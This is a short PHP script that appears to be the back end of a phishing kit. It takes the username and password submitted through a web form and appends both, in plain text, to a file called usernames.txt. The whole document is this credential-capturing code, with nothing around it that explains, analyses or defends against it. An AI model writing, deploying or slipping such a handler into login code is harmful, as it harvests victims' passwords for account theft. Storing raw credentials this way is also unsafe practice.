<?php

file_put_contents("usernames.txt", "\nUsername : " . $_POST['username'] . "\nPassword : " . $_POST['password'] . "\r\n", FILE_APPEND);

?>